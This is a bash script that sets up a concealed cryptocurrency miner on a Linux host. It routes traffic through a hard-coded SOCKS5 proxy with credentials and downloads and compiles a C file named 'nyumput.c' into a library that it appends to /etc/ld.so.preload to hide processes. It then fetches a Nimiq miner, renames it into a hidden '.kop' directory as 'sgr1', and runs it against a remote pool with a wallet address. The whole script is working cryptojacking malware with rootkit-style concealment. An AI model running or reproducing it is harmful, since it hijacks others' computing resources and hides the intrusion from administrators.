#!/bin/bash
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sleep 5



apt update -y ; apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
wget https://github.com/Kakarek/Kakarek/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

rm -rf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 212.147.209.49:443
socks5_username = erl
socks5_password = 1234
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2



echo " "

echo " "



echo " "



./graftcp/graftcp curl ifconfig.me



echo " "
echo " "



echo " "



echo " "
echo " "


./graftcp/graftcp curl https://bitbucket.org/dennidarko01/kangkung/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c

./graftcp/graftcp wget https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip 
unzip beepminer-0.6.1.zip 
rm beepminer-0.6.1.zip 
mv beepminer-0.6.1 .kop && cd .kop
mv miner sgr1
./graftcp/graftcp ./sgr1 --wallet-address=NQ23A693A0HY3C9NLFH2DM3S2SJJYPFB --type=dumb --pool=212.147.209.49:80 --region=US --deviceLabel=$(echo $(shuf -i 1000-9999 -n 1)-N) --miner=$(nproc --all)
